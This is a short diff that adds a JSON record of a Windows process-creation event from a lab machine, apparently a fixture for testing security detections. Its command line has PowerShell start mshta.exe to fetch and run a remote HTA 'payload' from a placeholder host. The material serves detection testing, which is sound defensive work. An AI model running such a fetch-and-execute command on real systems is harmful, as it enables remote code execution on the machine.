@@ -1,0 +1,10 @@
+{
+  "EventID": 4688,
+  "Image": "C:\\Windows\\System32\\mshta.exe",
+  "CommandLine": "mshta.exe https://example.invalid/payload.hta",
+  "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+  "ParentCommandLine": "powershell.exe -NoProfile -Command Start-Process mshta.exe",
+  "User": "LAB\\test-user",
+  "Computer": "WIN11-LAB",
+  "TimeCreated": "2026-08-24T15:00:00Z"
+}
